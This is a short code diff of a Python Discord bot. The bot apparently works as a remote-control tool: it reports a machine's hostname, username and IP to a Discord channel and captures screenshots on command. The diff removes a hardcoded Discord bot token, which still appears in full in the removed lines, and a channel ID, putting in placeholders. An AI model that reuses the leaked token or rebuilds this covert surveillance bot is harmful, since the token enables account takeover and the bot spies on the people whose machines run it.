@@ -1,4 +1,4 @@
-'MTAzNTUyMjA2NjI0NzU5MDAxOA.GdAbAg.z-5c-58c59Lqp2BNKwwE3AAmrLawKoTZTe3ke4'
+
 import webbrowser
 import os
 import cv2
@@ -46,7 +46,7 @@ async def on_command_error(ctx, error):
 @DisFunc.event
 async def on_ready():
     hostname = socket.gethostname()
-    channel = DisFunc.get_channel(1114220282614390788)  # Replace with your desired channel ID 
+    channel = DisFunc.get_channel(111422)  # Replace with your desired channel ID 
     user = getpass.getuser()
     ip = GetIP()
 
@@ -449,7 +449,7 @@ async def screenshot(ctx):
         await ctx.send(f"An error occurred while capturing the screenshot: {str(e)}")
 
 # Replace with your bot token
-loop.create_task(DisFunc.start('MTAzNTUyMjA2NjI0NzU5MDAxOA.GdAbAg.z-5c-58c59Lqp2BNKwwE3AAmrLawKoTZTe3ke4'))
+loop.create_task(DisFunc.start('your token here'))
 
 try:
     loop.run_forever()
